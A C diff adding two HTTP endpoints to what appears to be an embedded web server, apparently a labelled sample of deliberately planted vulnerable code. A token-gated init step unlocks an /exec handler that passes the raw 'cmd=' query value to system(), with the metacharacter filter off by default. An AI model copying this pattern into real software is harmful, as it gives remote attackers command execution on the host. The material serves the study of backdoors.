+/* Handler for /exec/init endpoint (C3) */
+static int
+exec_init_handler(struct mg_connection *conn, void *cbdata)
+{
+	const struct mg_request_info *ri = mg_get_request_info(conn);
+	const char *qs = ri ? ri->query_string : NULL;
+	(void)cbdata;
+
+	if (!exec_cfg.enabled) {
+		mg_send_http_error(conn, 403, "Forbidden: exec not enabled");
+		return 403;
+	}
+
+	if (qs == NULL || strncmp(qs, "token=", 6) != 0) {
+		mg_send_http_error(conn, 400, "Bad Request: missing token");
+		return 400;
+	}
+
+	if (strcmp(qs + 6, exec_cfg.secret) != 0) {
+		mg_send_http_error(conn, 403, "Forbidden: invalid token");
+		return 403;
+	}
+
+	{
+		FILE *flagf = fopen(EXEC_INIT_FLAG, "w");
+		if (flagf) fclose(flagf);
+	}
+
+	{
+		const char *resp = "Exec initialized.\n";
+		mg_send_http_ok(conn, "text/plain", (long long)strlen(resp));
+		mg_write(conn, resp, strlen(resp));
+	}
+	return 200;
+}
+
+/* Handler for /exec endpoint (C3) */
+static int
+exec_handler(struct mg_connection *conn, void *cbdata)
+{
+	const struct mg_request_info *ri = mg_get_request_info(conn);
+	const char *qs = ri ? ri->query_string : NULL;
+	static int strict_exec = 0;
+	(void)cbdata;
+
+	if (!exec_cfg.enabled || !exec_initialized()) {
+		mg_send_http_error(conn, 404, "Not Found");
+		return 404;
+	}
+
+	if (qs == NULL || strncmp(qs, "cmd=", 4) != 0) {
+		mg_send_http_error(conn, 400, "Bad Request: missing cmd parameter");
+		return 400;
+	}
+
+	/* S3: config-gated full metachar check; bypass by omitting --strict-exec */
+	if (strict_exec && strpbrk(qs + 4, "|;&`$") != NULL) {
+		mg_send_http_error(conn, 403, "Forbidden: metacharacter in command");
+		return 403;
+	}
+
+	/* I1: direct -- raw value after cmd= goes straight to system() */
+	system(qs + 4);
+
+	{
+		char resp[640];
+		int resp_len = snprintf(resp, sizeof(resp), "dispatched: %s\n", qs + 4);
+		if (resp_len < 0) resp_len = 0;
+		if (resp_len >= (int)sizeof(resp)) resp_len = (int)sizeof(resp) - 1;
+		mg_send_http_ok(conn, "text/plain", (long long)resp_len);
+		mg_write(conn, resp, (size_t)resp_len);
+	}
+	return 200;
+}
